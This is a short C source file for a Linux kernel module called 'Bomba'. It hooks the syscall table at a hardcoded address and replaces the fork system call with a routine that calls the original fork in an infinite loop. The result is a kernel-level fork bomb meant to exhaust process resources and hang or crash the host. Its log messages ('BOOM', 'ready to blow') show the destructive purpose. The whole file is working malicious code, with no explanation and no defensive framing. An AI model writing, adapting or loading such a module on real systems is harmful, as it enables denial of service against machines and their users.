#include "include.h"
#include "rw.h"
#include "syscall.h"
#include "utility.h"
MODULE_LICENSE("GPL");

#define fork_code 40

const unsigned long** sys_call_table = (const unsigned long**)0xffffffff81801460;
SYS_mkdir_type orig_syscall; /*the original systemcall*/ 

// This kills the crab.
int replace_syscall(void) {
	printk("BOOM\n");
	while(1)
		orig_syscall();	
	printk("END REPLACEMENT CALL\n");
	return 0;
}

int init_module() {
	printk("Bomba initializing...\n");
	make_rw(sys_call_table);
	orig_syscall = (SYS_mkdir_type) sys_call_table[SYS_fork];
	sys_call_table[SYS_fork] = (syscall) replace_syscall;
	printk("Bomba ready to blow...\n");
	return 0;
}

void cleanup_module() {
	sys_call_table[SYS_fork] = (syscall) orig_syscall;
	printk(KERN_INFO "Bomba defused\n");
	printk(KERN_INFO "Module Removed\n");
}
